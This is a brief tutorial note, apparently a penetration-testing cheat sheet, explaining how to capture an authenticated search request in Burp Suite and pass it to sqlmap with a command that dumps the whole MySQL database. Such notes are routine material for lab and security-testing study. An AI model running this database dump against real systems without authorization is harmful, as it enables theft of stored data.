# SQLMap

> Shahrukh Tramboo | February 15th, 2022

--------------------------------------

First we need to intercept a request made to the search feature using BurpSuite.

Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session.

```bash
sqlmap -r request.txt --dbms=mysql --dump
```

-r uses the intercepted request you saved earlier
--dbms tells SQLMap what type of database management system it is
--dump attempts to outputs the entire database



